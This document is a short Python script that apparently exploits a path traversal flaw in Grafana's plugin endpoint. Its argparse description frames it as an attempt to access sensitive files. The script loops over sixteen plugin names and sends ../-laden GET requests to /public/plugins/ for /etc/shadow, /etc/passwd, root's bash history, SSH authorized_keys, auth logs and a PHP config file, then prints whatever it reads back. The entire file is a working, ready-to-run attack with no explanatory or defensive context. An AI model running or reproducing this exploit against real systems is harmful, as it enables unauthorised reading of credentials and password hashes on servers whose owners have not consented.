import http.client
import argparse

# Set up argument parsing
parser = argparse.ArgumentParser(description="Attempt to access sensitive files via various plugins.")
parser.add_argument('--host', type=str, default='localhost', help='Target host (default: localhost)')
parser.add_argument('--port', type=int, default=3000, help='Target port (default: 3000)')

args = parser.parse_args()

# Use arguments from CLI or default values
host = args.host
port = args.port

# List of plugins to try
plugins = [
    "alertlist",
     "cloudwatch", "dashlist", "elasticsearch", "graph",
    "graphite", "heatmap", "influxdb", "mysql", "opentsdb", 
    "pluginlist", "postgres", "prometheus", "stackdriver", "table", "text"
]

# List of potential sensitive file paths to try
sensitive_paths = [
    "../../../../../../../../../../../../../etc/passwd",
    "../../../../../../../../../../../../../etc/shadow",
    "../../../../../../../../../../../../../etc/hosts",
    "../../../../../../../../../../../../../etc/hostname",
    "../../../../../../../../../../../../../etc/group",
    "../../../../../../../../../../../../../root/.bash_history",
    "../../../../../../../../../../../../../root/.ssh/authorized_keys",
    "../../../../../../../../../../../../../var/log/syslog",
    "../../../../../../../../../../../../../var/log/auth.log",
    "../../../../../../../../../../../../../var/www/html/config.php"
]

# Define the headers
headers = {
    "Accept-Encoding": "gzip, deflate",
    "Accept": "*/*",
    "Accept-Language": "en",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36",
    "Connection": "close"
}

# Create a connection object
conn = http.client.HTTPConnection(host, port)

# Nested loop: Iterate over each plugin and each sensitive path
for plugin in plugins:
    for sensitive_path in sensitive_paths:
        # Construct the full path to try
        path = f"/public/plugins/{plugin}/{sensitive_path}"
        
        print(f"Attempting to access: {path}")
        
        # Send the GET request using the exact path provided (without normalization)
        conn.request("GET", path, headers=headers)
        
        # Get the response
        response = conn.getresponse()
        
        # Read and print the response content if the status is 200 (OK)
        if response.status == 200:
            print(f"Success: Accessed {path}")
            print(response.read().decode())
        else:
            print(f"Failed: {response.status} {response.reason}")
        
        # Ensure the connection is closed after each request
        conn.close()
        
        # Re-open the connection for the next request
        conn = http.client.HTTPConnection(host, port)

# Close the final connection
conn.close()
